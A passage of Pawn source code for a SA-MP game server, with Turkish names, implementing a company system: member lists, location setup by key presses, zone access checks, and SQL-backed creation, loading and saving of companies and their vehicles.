		    format(DiaYazi, 2000, "%s{AAAAAA}%s\t%s\t{00FF00}%d$\t{ADFF2F}%s\n", DiaYazi, SirketUyeListName[playerid][i], SirketUyeListSonGiris[playerid][i], SirketUyeListKatki[playerid][i], SirketRutbeName[ SirketUyeListRutbe[playerid][i] ]);
		}else{
		    format(DiaYazi, 2000, "%s{F8F8FF}%s(%d)\t%s\t{00FF00}%d$\t{ADFF2F}%s\n", DiaYazi, SirketUyeListName[playerid][i], ID, SirketUyeListSonGiris[playerid][i], SirketUyeListKatki[playerid][i], SirketRutbeName[ SirketUyeListRutbe[playerid][i] ]);
		}

		uSayi++;
	}

    if(uSayi == 25) format(DiaYazi, 2000, "%s{FFC000}Sonraki Sayfa", DiaYazi);

	ShowPlayerDialog(playerid, DialogSirketUyeList, DIALOG_STYLE_TABLIST_HEADERS, "{00CED1}Þirket Üye Listesi", DiaYazi, "Seç", "Geri");
	return 1;
}

SirketKeys(playerid, newkeys, oldkeys)
{
    new Float:lol, Float:oX, Float:oY, Float:oZ;

	if ((newkeys & KEY_CROUCH) && !(oldkeys & KEY_CROUCH))
	{
		if (GetPlayerVehicleSeat(playerid) == 0 && Sirket[playerid] != -1)
		{
			foreach(new i:SRKTs)
			{
			    if(Sirket[playerid] != i) continue;
				if(IsPlayerInRangeOfPoint(playerid, 2.5, Sirketler[i][SirketBenzinX], Sirketler[i][SirketBenzinY], Sirketler[i][SirketBenzinZ]))
				{
				    SirketBenzini[playerid] = 1;
					GameTextForPlayer(playerid, TXT_Refuelling, 3000, 4);
					TogglePlayerControllable(playerid, 0);
				    SetTimerEx("RefuelVehicle", 5000, false, "i", playerid);
					break;
				}
			}
		}
	}

    if(TSirketDurum[playerid] == 1 && newkeys == KEY_NO)
	{
	    GetPlayerPos(playerid, TSirketPos[playerid][0], TSirketPos[playerid][1], TSirketPos[playerid][2]);
		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirketin kapýsýnýn dýþýnda çýkacak bilgi pickupunun yerine gidip N tuþuna basýn.");
		TSirketDurum[playerid] = 2;
		return 1;
	}

    if(TSirketDurum[playerid] == 2 && newkeys == KEY_NO)
	{
	    GetPlayerPos(playerid, TSirketInfo[playerid][0], TSirketInfo[playerid][1], TSirketInfo[playerid][2]);
		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket mekanýnýn bir köþesine gidip N tuþuna basýn.");
		TSirketDurum[playerid] = 3;
		return 1;
	}

	if(TSirketDurum[playerid] == 3 && newkeys == KEY_NO)
	{
	    GetPlayerPos(playerid, TSirketArea[playerid][0], TSirketArea[playerid][1], lol);
		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket mekanýnýn bu köþeye en uzak köþesine gidip N tuþuna basýn.");
		TSirketDurum[playerid] = 4;
 		return 1;
	}

	if(TSirketDurum[playerid] == 4 && newkeys == KEY_NO)
	{
	    GetPlayerPos(playerid, TSirketArea[playerid][2], TSirketArea[playerid][3], lol);
		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket tarafýndan spawn edilecek kasalarýn yerini belirleyip N tuþuna basýn.");
		TSirketDurum[playerid] = 5;
		return 1;
	}

	if(TSirketDurum[playerid] == 5 && newkeys == KEY_NO)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        GetVehiclePos(GetPlayerVehicleID(playerid), TSirketKasa[playerid][0], TSirketKasa[playerid][1], TSirketKasa[playerid][2]);
	        GetVehicleZAngle(GetPlayerVehicleID(playerid), TSirketKasa[playerid][3]);
	    }else{
	        GetPlayerPos(playerid, TSirketKasa[playerid][0], TSirketKasa[playerid][1], TSirketKasa[playerid][2]);
	        GetPlayerFacingAngle(playerid, TSirketKasa[playerid][3]);
	    }

		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket benzinliðinin yerini N tuþuna basarak belirleyin.");

		TSirketDurum[playerid] = 6;
		return 1;
	}

	if(TSirketDurum[playerid] == 6 && newkeys == KEY_NO)
	{
	    GetPlayerPos(playerid, TSirketBenzin[playerid][0], TSirketBenzin[playerid][1], TSirketBenzin[playerid][2]);
		SendClientMessage(playerid, -1, "{F8F8FF}Þimdi þirket kapýsýnýn yerini belirleyin.");

		GetPlayerPos(playerid, oX, oY, oZ);
		TSirketKapi[playerid] = CreateDynamicObject(975, oX + 5.0, oY + 5.0, oZ, 0.0, 0.0, 0.0);
		EditDynamicObject(playerid, TSirketKapi[playerid]);

		TSirketDurum[playerid] = 7;
		return 1;
	}

	return 1;
}

LoadSirketDetails(SirketID)
{
	//if(Sirketler[SirketID][Sirket3D] != Text3D:-1) Delete3DTextLabel(Sirketler[SirketID][Sirket3D]);
	//if(Sirketler[SirketID][SirketPickup] != -1) DestroyPickup(Sirketler[SirketID][SirketPickup]);
	if(Sirketler[SirketID][SirketInfo3D] != Text3D:-1) Delete3DTextLabel(Sirketler[SirketID][SirketInfo3D]);
	if(Sirketler[SirketID][SirketInfoPickup] != -1) DestroyPickup(Sirketler[SirketID][SirketInfoPickup]);
	if(Sirketler[SirketID][SirketBenzin3D] != Text3D:-1) Delete3DTextLabel(Sirketler[SirketID][SirketBenzin3D]);
	if(Sirketler[SirketID][SirketBenzinPickup] != -1) DestroyPickup(Sirketler[SirketID][SirketBenzinPickup]);

	new Yazi[256];
	//format(Yazi, 256, "{00FF00}ÞÝRKET %d\n{F8F8FF}%s\n{F8F8FF}Spawn Yeri", SirketID, Sirketler[SirketID][SirketName]);
	//Sirketler[SirketID][Sirket3D] = Create3DTextLabel(Yazi, 0xFFFFFFFF, Sirketler[SirketID][SirketX], Sirketler[SirketID][SirketY], Sirketler[SirketID][SirketZ], 35.0, 0);
	//Sirketler[SirketID][SirketPickup] = CreatePickup(1210, 1, Sirketler[SirketID][SirketX], Sirketler[SirketID][SirketY], Sirketler[SirketID][SirketZ]);

	format(Yazi, 256, "{00FF00}ÞÝRKET %d\n{F8F8FF}%s\n{F8F8FF}Bilgi almak için buraya gelin.", SirketID, Sirketler[SirketID][SirketName]);
	Sirketler[SirketID][SirketInfo3D] = Create3DTextLabel(Yazi, 0xFFFFFFFF, Sirketler[SirketID][SirketInfoX], Sirketler[SirketID][SirketInfoY], Sirketler[SirketID][SirketInfoZ], 35.0, 0);
	Sirketler[SirketID][SirketInfoPickup] = CreatePickup(1210, 1, Sirketler[SirketID][SirketInfoX], Sirketler[SirketID][SirketInfoY], Sirketler[SirketID][SirketInfoZ]);

	Sirketler[SirketID][SirketBenzin3D] = Create3DTextLabel("{00FF00}Þirket Benzinliði\n{F8F8FF}Benzin almak için kornaya basýn.", 0xFFFFFFFF, Sirketler[SirketID][SirketBenzinX], Sirketler[SirketID][SirketBenzinY], Sirketler[SirketID][SirketBenzinZ], 35.0, 0);
	Sirketler[SirketID][SirketBenzinPickup] = CreatePickup(1244, 1, Sirketler[SirketID][SirketBenzinX], Sirketler[SirketID][SirketBenzinY], Sirketler[SirketID][SirketBenzinZ]);
}

ShowSirketZones(playerid)
{
	foreach(new i:SRKTs)
	{
	    if(Sirketler[i][SirketExist] != 1) continue;
	    GangZoneShowForPlayer(playerid, Sirketler[i][SirketZone], 0xADFF2FAA);
	}
}

SirketZoneControl()
{
	new Float:oX, Float:oY, Float:oZ;

	foreach(new playerid:Player)
	{
	    GetPlayerPos(playerid, oX, oY, oZ);

	    foreach(new i:SRKTs)
	    {
	        if(Sirketler[i][SirketExist] != 1) continue;
	        if(oX < Sirketler[i][SirketMinX] || oY < Sirketler[i][SirketMinY] || oX > Sirketler[i][SirketMaxX] || oY > Sirketler[i][SirketMaxY]) continue;
	        if(APlayerData[playerid][PlayerLevel] > 0 || Root[playerid] == 1) continue;
	        if(Sirket[playerid] != i)
	        {
	            if(oZ <= Sirketler[i][SirketInfoZ] + 25.0)
	            {
					SendClientMessage(playerid, -1, "{FF0000}Þirket HQ'suna sadece þirket üyeleri girebilir!");
					SetPlayerPos(playerid, Sirketler[i][SirketInfoX]+3.0, Sirketler[i][SirketInfoY]+3.0, Sirketler[i][SirketInfoZ]);
				}
			}
	    }
	}
}


forward CreateSirket(sname[], stag[], sdeger);
public CreateSirket(sname[], stag[], sdeger)
{
	new CreatedID = Iter_Free(SRKTs), formaty[128];

	Iter_Add(SRKTs, CreatedID);
	Sirketler[CreatedID][SirketExist] = 1;

	format(Sirketler[CreatedID][SirketName], 128, sname);
	format(Sirketler[CreatedID][SirketTag], 5, stag);
	format(Sirketler[CreatedID][SirketSahip], 70, "Yok");

	Sirketler[CreatedID][SirketUye] = 0;
	Sirketler[CreatedID][SirketMaxUye] = 0;

	Sirketler[CreatedID][SirketKasa] = 0;
	Sirketler[CreatedID][SirketDeger] = sdeger;
	Sirketler[CreatedID][SirketOran] = 30;

	format(Sirketler[CreatedID][SirketDolum], 20, "Yok");
	Sirketler[CreatedID][SirketBorc] = 0;

	//Sirketler[CreatedID][Sirket3D] = Text3D:-1;
	//Sirketler[CreatedID][SirketPickup] = -1;
	Sirketler[CreatedID][SirketInfo3D] = Text3D:-1;
	Sirketler[CreatedID][SirketInfoPickup] = -1;
	Sirketler[CreatedID][SirketBenzin3D] = Text3D:-1;
	Sirketler[CreatedID][SirketBenzinPickup] = -1;
	
	format(Sirketler[CreatedID][SirketDuyuru], 50, "Yok");

 	new handle = SQL::Open(SQL::INSERT, "sirketler");
  	SQL::WriteInt(handle, "ID", CreatedID);
    SQL::WriteString(handle, "Name", Sirketler[CreatedID][SirketName]);

    SQL::WriteString(handle, "Tag", Sirketler[CreatedID][SirketTag]);
    SQL::WriteString(handle, "Sahip", Sirketler[CreatedID][SirketSahip]);

	SQL::WriteInt(handle, "Uye", Sirketler[CreatedID][SirketUye]);
 	SQL::WriteInt(handle, "MaxUye", Sirketler[CreatedID][SirketMaxUye]);
 	SQL::WriteInt(handle, "Kasa", Sirketler[CreatedID][SirketKasa]);
	SQL::WriteInt(handle, "Deger", Sirketler[CreatedID][SirketDeger]);

	format(formaty,128,"0.0|0.0|0.0");
  	SQL::WriteString(handle, "XYZ", formaty);

  	SQL::WriteString(handle, "InfoXYZ", formaty);

    format(formaty,128,"0.0|0.0");
  	SQL::WriteString(handle, "MinXY", formaty);

  	SQL::WriteString(handle, "MaxXY", formaty);

    format(formaty,128,"0.0|0.0|0.0");
  	SQL::WriteString(handle, "GateXYZ", formaty);

  	SQL::WriteString(handle, "GateRXYZ", formaty);

    format(formaty,128,"0.0|0.0|0.0|0.0");
  	SQL::WriteString(handle, "KasaXYZRZ", formaty);

    format(formaty,128,"0.0|0.0|0.0");
  	SQL::WriteString(handle, "BenzinXYZ", formaty);

    format(formaty,128,"0|0");
  	SQL::WriteString(handle, "Renk12", formaty);

  	SQL::WriteInt(handle, "SirketOran", 30);
  	SQL::WriteString(handle, "SirketDolum", Sirketler[CreatedID][SirketDolum]);
  	SQL::WriteInt(handle, "SirketBorc", Sirketler[CreatedID][SirketBorc]);
  	
  	SQL::WriteString(handle, "SirketDuyuru", "Yok");
  	
    SQL::Close(handle);

	return CreatedID;
}


forward DeleteSirket(SirketID);
public DeleteSirket(SirketID)
{
	if(Sirketler[SirketID][SirketExist] == 0) return 0;
	Sirketler[SirketID][SirketExist] = 0;
	Iter_Remove(SRKTs, SirketID);

	DestroyDynamicObject(Sirketler[SirketID][SirketGate]);

	//Delete3DTextLabel(Sirketler[SirketID][Sirket3D]);
	//Sirketler[SirketID][Sirket3D] = Text3D:-1;

	//DestroyPickup(Sirketler[SirketID][SirketPickup]);
	//Sirketler[SirketID][SirketPickup] = -1;

	Delete3DTextLabel(Sirketler[SirketID][SirketInfo3D]);
	Sirketler[SirketID][SirketInfo3D] = Text3D:-1;

	DestroyPickup(Sirketler[SirketID][SirketInfoPickup]);
	Sirketler[SirketID][SirketInfoPickup] = -1;

	Delete3DTextLabel(Sirketler[SirketID][SirketBenzin3D]);
	Sirketler[SirketID][SirketBenzin3D] = Text3D:-1;

	DestroyPickup(Sirketler[SirketID][SirketBenzinPickup]);
	Sirketler[SirketID][SirketBenzinPickup] = -1;

	GangZoneHideForAll(Sirketler[SirketID][SirketZone]);
	GangZoneDestroy(Sirketler[SirketID][SirketZone]);

	SieGoAwaySirketArabas(SirketID);
	SieGoAwaySirketUyeleri(SirketID);

    SQL::DeleteRow("sirketler", "ID", SirketID);
    SQL::DeleteRow("sirketaraclar", "SirketID", SirketID);
	return 1;
}
/*
forward LoadSirkets();
public LoadSirkets()
{
	new query[256], bID, Loadedcount;
	new EvoturK[80], EvoreyiZ[3][48];

	mysql_format(Connection, query, sizeof(query), "SELECT * FROM `sirketler` ORDER BY `ID` ASC");
	new rows = cache_num_rows();
    if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    	bID = cache_get_field_content_int(i, "ID");

				cache_get_field_content(i, "GateXYZ", EvoturK);

				split(EvoturK, EvoreyiZ, '|');
				Sirketler[bID][SirketGateX] = floatstr(EvoreyiZ[0]);
				Sirketler[bID][SirketGateY] = floatstr(EvoreyiZ[1]);
				Sirketler[bID][SirketGateZ] = floatstr(EvoreyiZ[2]);

				cache_get_field_content(i, "GateRXYZ", EvoturK);

 		    	split(EvoturK, EvoreyiZ, '|');
				Sirketler[bID][SirketGateRX] = floatstr(EvoreyiZ[0]);
				Sirketler[bID][SirketGateRY] = floatstr(EvoreyiZ[1]);
				Sirketler[bID][SirketGateRZ] = floatstr(EvoreyiZ[2]);

 		    	cache_get_field_content(i, "MinXY", EvoturK);

 		    	split(EvoturK, EvoreyiZ, '|');
				Sirketler[bID][SirketMinX] = floatstr(EvoreyiZ[0]);
				Sirketler[bID][SirketMinY] = floatstr(EvoreyiZ[1]);

 		    	cache_get_field_content(i, "MaxXY", EvoturK);

 		    	split(EvoturK, EvoreyiZ, '|');
				Sirketler[bID][SirketMaxX] = floatstr(EvoreyiZ[0]);
				Sirketler[bID][SirketMaxY] = floatstr(EvoreyiZ[1]);



			 	Sirketler[bID][SirketInfo3D] = Text3D:-1;
				Sirketler[bID][SirketInfoPickup] = -1;
				Sirketler[bID][SirketBenzin3D] = Text3D:-1;
				Sirketler[bID][SirketBenzinPickup] = -1;

				Sirketler[bID][SirketExist] = 1;
		        Iter_Add(SRKTs, bID);
		        LoadSirketDetails(bID);
		        Sirketler[bID][SirketGate] = CreateDynamicObject(975, Sirketler[bID][SirketGateX], Sirketler[bID][SirketGateY], Sirketler[bID][SirketGateZ], Sirketler[bID][SirketGateRX], Sirketler[bID][SirketGateRY], Sirketler[bID][SirketGateRZ]);
				Sirketler[bID][SirketZone] = GangZoneCreate(Sirketler[bID][SirketMinX], Sirketler[bID][SirketMinY], Sirketler[bID][SirketMaxX], Sirketler[bID][SirketMaxY]);
			    Loadedcount++;
	 	}
	}

 	printf("%d sirket yuklendi.", Loadedcount);
}
*/

forward LoadSirkets();
public LoadSirkets()
{
	new bID, Loadedcount;
	new EvoturK[80], EvoreyiZ[4][48];
	if(SQL::TableExists("sirketler"))
	{
		new handle = SQL::Open(SQL::MTREAD, "sirketler");
		SQL::ReadRetrievedRows(handle, i)
		{
            SQL::ReadInt(handle, "ID", bID, i);

			SQL::ReadInt(handle, "Uye", Sirketler[bID][SirketUye], i);
		 	SQL::ReadInt(handle, "MaxUye", Sirketler[bID][SirketMaxUye], i);
		 	SQL::ReadInt(handle, "Kasa", Sirketler[bID][SirketKasa], i);
			SQL::ReadInt(handle, "Deger", Sirketler[bID][SirketDeger], i);
			
			SQL::ReadString(handle, "Name", Sirketler[bID][SirketName], 30, i);
			SQL::ReadString(handle, "Tag", Sirketler[bID][SirketTag], 30, i);
			SQL::ReadString(handle, "Sahip", Sirketler[bID][SirketSahip], 30, i);
			
			SQL::ReadString(handle, "SirketDuyuru", Sirketler[bID][SirketDuyuru], 256, i);
            
            SQL::ReadString(handle, "XYZ", EvoturK, 50, i);
            
            split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketZ] = floatstr(EvoreyiZ[2]);
			
			SQL::ReadString(handle, "InfoXYZ", EvoturK, 50, i);
			
			split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketInfoX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketInfoY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketInfoZ] = floatstr(EvoreyiZ[2]);

    		SQL::ReadString(handle, "GateXYZ", EvoturK, 50, i);
    		
    		split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketGateX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketGateY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketGateZ] = floatstr(EvoreyiZ[2]);
    		
    		SQL::ReadString(handle, "GateRXYZ", EvoturK, 50, i);
    		
            split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketGateRX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketGateRY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketGateRZ] = floatstr(EvoreyiZ[2]);
    		
    		SQL::ReadString(handle, "MinXY", EvoturK, 50, i);
    		
    		split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketMinX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketMinY] = floatstr(EvoreyiZ[1]);
    		
    		SQL::ReadString(handle, "MaxXY", EvoturK, 50, i);
    		
            split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketMaxX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketMaxY] = floatstr(EvoreyiZ[1]);
			
			SQL::ReadString(handle, "KasaXYZRZ", EvoturK, 50, i);
			
			split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketKasaX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketKasaY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketKasaZ] = floatstr(EvoreyiZ[2]);
			Sirketler[bID][SirketKasaRZ] = floatstr(EvoreyiZ[3]);
			
			SQL::ReadString(handle, "BenzinXYZ", EvoturK, 50, i);
			
			split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketBenzinX] = floatstr(EvoreyiZ[0]);
			Sirketler[bID][SirketBenzinY] = floatstr(EvoreyiZ[1]);
			Sirketler[bID][SirketBenzinZ] = floatstr(EvoreyiZ[2]);
			
			SQL::ReadString(handle, "Renk12", EvoturK, 50, i);
			
			split(EvoturK, EvoreyiZ, '|');
			Sirketler[bID][SirketRenk1] = strval(EvoreyiZ[0]);
			Sirketler[bID][SirketRenk2] = strval(EvoreyiZ[1]);
			
            SQL::ReadInt(handle, "SirketOran", Sirketler[bID][SirketOran], i);
			SQL::ReadString(handle, "SirketDolum", Sirketler[bID][SirketDolum], 20, i);
			SQL::ReadInt(handle, "SirketBorc", Sirketler[bID][SirketBorc], i);

            Sirketler[bID][SirketInfo3D] = Text3D:-1;
			Sirketler[bID][SirketInfoPickup] = -1;
			Sirketler[bID][SirketBenzin3D] = Text3D:-1;
			Sirketler[bID][SirketBenzinPickup] = -1;

			Sirketler[bID][SirketExist] = 1;
		    Iter_Add(SRKTs, bID);
      		LoadSirketDetails(bID);
		    Sirketler[bID][SirketGate] = CreateDynamicObject(975, Sirketler[bID][SirketGateX], Sirketler[bID][SirketGateY], Sirketler[bID][SirketGateZ], Sirketler[bID][SirketGateRX], Sirketler[bID][SirketGateRY], Sirketler[bID][SirketGateRZ]);
			Sirketler[bID][SirketZone] = GangZoneCreate(Sirketler[bID][SirketMinX], Sirketler[bID][SirketMinY], Sirketler[bID][SirketMaxX], Sirketler[bID][SirketMaxY]);
			Loadedcount++;
		}
		SQL::Close(handle);
	}
	printf("%d sirket yuklendi.", Loadedcount);
}

forward SaveSirkets();
public SaveSirkets()
{
	foreach(new i:SRKTs)
	{
	    if(Sirketler[i][SirketExist] != 1) continue;
	    if(Sirketler[i][SirketNeedSave] != 1) continue;
	    Sirketler[i][SirketNeedSave] = 0;

		new handle = SQL::Open(SQL::UPDATE, "sirketler", "ID", i), formaty[1024];
	    SQL::WriteString(handle, "Name", Sirketler[i][SirketName]);
	    SQL::WriteString(handle, "Tag", Sirketler[i][SirketTag]);
   	 	SQL::WriteString(handle, "Sahip", Sirketler[i][SirketSahip]);

 		SQL::WriteString(handle, "SirketDuyuru", Sirketler[i][SirketDuyuru]);

	    SQL::WriteInt(handle, "Uye", Sirketler[i][SirketUye]);
	    SQL::WriteInt(handle, "MaxUye", Sirketler[i][SirketMaxUye]);

	    SQL::WriteInt(handle, "Kasa", Sirketler[i][SirketKasa]);
	    SQL::WriteInt(handle, "Deger", Sirketler[i][SirketDeger]);

        format(formaty, 128,"%f|%f|%f",Sirketler[i][SirketX],Sirketler[i][SirketY],Sirketler[i][SirketZ]);
	    SQL::WriteString(handle, "XYZ", formaty);

		format(formaty, 128, "%f|%f|%f", Sirketler[i][SirketInfoX],Sirketler[i][SirketInfoY],Sirketler[i][SirketInfoZ]);
	    SQL::WriteString(handle, "InfoXYZ", formaty);

		format(formaty, 128,"%f|%f",Sirketler[i][SirketMinX],Sirketler[i][SirketMinY]);
	    SQL::WriteString(handle, "MinXY", formaty);

	    format(formaty, 128,"%f|%f",Sirketler[i][SirketMaxX],Sirketler[i][SirketMaxY]);
	    SQL::WriteString(handle, "MaxXY", formaty);

		format(formaty, 128, "%f|%f|%f",Sirketler[i][SirketGateX],Sirketler[i][SirketGateY],Sirketler[i][SirketGateZ]);
	    SQL::WriteString(handle, "GateXYZ", formaty);
	    
	    format(formaty, 128, "%f|%f|%f",Sirketler[i][SirketGateRX],Sirketler[i][SirketGateRY],Sirketler[i][SirketGateRZ]);
	    SQL::WriteString(handle, "GateRXYZ", formaty);

		format(formaty, 128,"%f|%f|%f|%f",Sirketler[i][SirketKasaX],Sirketler[i][SirketKasaY],Sirketler[i][SirketKasaZ],Sirketler[i][SirketKasaRZ]);
	    SQL::WriteString(handle, "KasaXYZRZ", formaty);

		format(formaty, 128,"%f|%f|%f",Sirketler[i][SirketBenzinX],Sirketler[i][SirketBenzinY],Sirketler[i][SirketBenzinZ]);
	    SQL::WriteString(handle, "BenzinXYZ", formaty);

		format(formaty, 128,"%i|%i",Sirketler[i][SirketRenk1],Sirketler[i][SirketRenk2]);
        SQL::WriteString(handle, "Renk12", formaty);

        SQL::WriteInt(handle, "SirketOran", Sirketler[i][SirketOran]);

        SQL::WriteString(handle, "SirketDolum", Sirketler[i][SirketDolum]);
        SQL::WriteInt(handle, "SirketBorc", Sirketler[i][SirketBorc]);
        
	    SQL::Close(handle);
	}
}

SirketArabaControl()
{
	foreach(new i:SAs)
	{
	    if(GetVehicleModel( SirketAraba[i][SAAID] ) == 0)
	    {
	        ArabaSirket[ SirketAraba[i][SAAID] ] = -1;
	        SirketAraba[i][SAAID] = Vehicle_Create(SirketAraba[i][SAModel], SirketAraba[i][SAX], SirketAraba[i][SAY], SirketAraba[i][SAZ], SirketAraba[i][SARZ], Sirketler[i][SirketRenk1], Sirketler[i][SirketRenk2], -1);
			ArabaSirket[ SirketAraba[i][SAAID] ] = i;

			Attach3DTextLabelToVehicle(SirketAraba[i][SA3D], SirketAraba[i][SAAID], 0.0, 0.0, 0.0);
	    }
	}
}

/*
RESirketArabaControl()
{
	foreach(new i:SAs)
	{
	    if(GetVehicleModel( SirketAraba[i][SAAID] ) == 0)
	    {
	        Delete3DTextLabel(SirketAraba[i][SA3D]);
	        ArabaSirket[ SirketAraba[i][SAAID] ] = -1;
	        SirketAraba[i][SAAID] = Vehicle_Create(SirketAraba[i][SAModel], SirketAraba[i][SAX], SirketAraba[i][SAY], SirketAraba[i][SAZ], SirketAraba[i][SARZ], Sirketler[i][SirketRenk1], Sirketler[i][SirketRenk2], -1);
			ArabaSirket[ SirketAraba[i][SAAID] ] = i;

			Attach3DTextLabelToVehicle(SirketAraba[i][SA3D], SirketAraba[i][SAAID], 0.0, 0.0, 0.0);
	    }
	}
}*/

forward CreateSirketAraba(SirketID, SACModel, Fiyat, Float:X, Float:Y, Float:Z, Float:RZ);
public CreateSirketAraba(SirketID, SACModel, Fiyat, Float:X, Float:Y, Float:Z, Float:RZ)
{
	new CreatedID = Iter_Free(SAs);

	Iter_Add(SAs, CreatedID);
	SirketAraba[CreatedID][SAExist] = 1;

	SirketAraba[CreatedID][SASirketID] = SirketID;
	SirketAraba[CreatedID][SAModel] = SACModel;
	SirketAraba[CreatedID][SAFiyat] = Fiyat;
	SirketAraba[CreatedID][SAMinRutbe] = 0;
	SirketAraba[CreatedID][SAX] = X;
	SirketAraba[CreatedID][SAY] = Y;
	SirketAraba[CreatedID][SAZ] = Z;
	SirketAraba[CreatedID][SARZ] = RZ;

	SirketAraba[CreatedID][SAAID] = Vehicle_Create(SirketAraba[CreatedID][SAModel], SirketAraba[CreatedID][SAX], SirketAraba[CreatedID][SAY], SirketAraba[CreatedID][SAZ], SirketAraba[CreatedID][SARZ], Sirketler[SirketID][SirketRenk1], Sirketler[SirketID][SirketRenk2], -1);
	ArabaSirket[ SirketAraba[CreatedID][SAAID] ] = CreatedID;

	new Yazi[128];
	format(Yazi, 128, "{00FF00}Þirket Arabasý\n{F8F8FF}\"%s\"", Sirketler[ SirketAraba[CreatedID][SASirketID] ][SirketName]);
	SirketAraba[CreatedID][SA3D] = Create3DTextLabel(Yazi, 0xFFFFFFFF, SirketAraba[CreatedID][SAX], SirketAraba[CreatedID][SAY], SirketAraba[CreatedID][SAZ], 35.0, 0);
	Attach3DTextLabelToVehicle(SirketAraba[CreatedID][SA3D], SirketAraba[CreatedID][SAAID], 0.0, 0.0, 0.0);


    new handle = SQL::Open(SQL::INSERT, "sirketaraclar");
  	SQL::WriteInt(handle, "ID", CreatedID);

	SQL::WriteInt(handle, "SirketID", SirketAraba[CreatedID][SASirketID]);
 	SQL::WriteInt(handle, "Model", SirketAraba[CreatedID][SAModel]);
 	SQL::WriteInt(handle, "Fiyat", SirketAraba[CreatedID][SAFiyat]);
	SQL::WriteInt(handle, "MinRutbe", SirketAraba[CreatedID][SAMinRutbe]);

  	SQL::WriteFloat(handle, "X", SirketAraba[CreatedID][SAX]);
  	SQL::WriteFloat(handle, "Y", SirketAraba[CreatedID][SAY]);
  	SQL::WriteFloat(handle, "Z", SirketAraba[CreatedID][SAZ]);
  	SQL::WriteFloat(handle, "RZ", SirketAraba[CreatedID][SARZ]);


    SQL::Close(handle);

/*
	new FileName[80];
	format(FileName, 80, SirketArabaFile, CreatedID);
	new INI:File = INI_Open(FileName);

	INI_SetTag(File, "sa");

	INI_WriteInt(File, "SirketID", SirketAraba[CreatedID][SASirketID]);
	INI_WriteInt(File, "Model", SirketAraba[CreatedID][SAModel]);
	INI_WriteInt(File, "Fiyat", SirketAraba[CreatedID][SAFiyat]);
	INI_WriteInt(File, "MinRutbe", SirketAraba[CreatedID][SAMinRutbe]);
	INI_WriteFloat(File, "X", SirketAraba[CreatedID][SAX]);
	INI_WriteFloat(File, "Y", SirketAraba[CreatedID][SAY]);
	INI_WriteFloat(File, "Z", SirketAraba[CreatedID][SAZ]);
	INI_WriteFloat(File, "RZ", SirketAraba[CreatedID][SARZ]);

	INI_Close(File);
*/
	return CreatedID;
}

forward DeleteSirketAraba(SirketArabaID);
public DeleteSirketAraba(SirketArabaID)
{
	if(SirketAraba[SirketArabaID][SAExist] != 1) return 0;
	ArabaSirket[ SirketAraba[SirketArabaID][SAAID] ] = -1;
	Iter_Remove(SAs, SirketArabaID);
	SirketAraba[SirketArabaID][SAExist] = 0;

	DestroyVehicle(SirketAraba[SirketArabaID][SAAID]);
	Delete3DTextLabel(SirketAraba[SirketArabaID][SA3D]);

    SQL::DeleteRow("sirketaraclar", "ID", SirketArabaID);
	return 1;
}

forward LoadSirketArabas();
public LoadSirketArabas()
{
	new Yazi[500], bID, Loadedcount;
	//new Float:Carx,Float:Cary,Float:Carz,Float:Carrz;
	if(SQL::TableExists("sirketaraclar"))
	{
		new handle = SQL::Open(SQL::MTREAD, "sirketaraclar");
		SQL::ReadRetrievedRows(handle, i)
		{
            SQL::ReadInt(handle, "ID", bID, i);

            SQL::ReadInt(handle, "Model", SirketAraba[bID][SAModel], i);
            SQL::ReadInt(handle, "SirketID", SirketAraba[bID][SASirketID], i);

    		SQL::ReadFloat(handle, "X", SirketAraba[bID][SAX], i);
    		SQL::ReadFloat(handle, "Y", SirketAraba[bID][SAY], i);
    		SQL::ReadFloat(handle, "Z", SirketAraba[bID][SAZ], i);
    		SQL::ReadFloat(handle, "RZ", SirketAraba[bID][SARZ], i);

            SQL::ReadInt(handle, "Fiyat", SirketAraba[bID][SAFiyat], i);
            SQL::ReadInt(handle, "MinRutbe", SirketAraba[bID][SAMinRutbe], i);

            Iter_Add(SAs, bID);
			SirketAraba[bID][SAExist] = 1;
            printf("Sirket ID: %d MysqlID: %d Model: %d X: %f Y: %f Z: %f RZ: %f Renk1: %d renk2: %d ", SirketAraba[bID][SASirketID], bID, SirketAraba[bID][SAModel], SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], SirketAraba[bID][SARZ], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk1], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk2]);
			SirketAraba[bID][SAAID] = Vehicle_Create(SirketAraba[bID][SAModel], SirketAraba[bID][SAX], SirketAraba[bID][SAY], SirketAraba[bID][SAZ], SirketAraba[bID][SARZ], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk1], Sirketler[ SirketAraba[bID][SASirketID] ][SirketRenk2], 600);
			ArabaSirket[ SirketAraba[bID][SAAID] ] = bID;

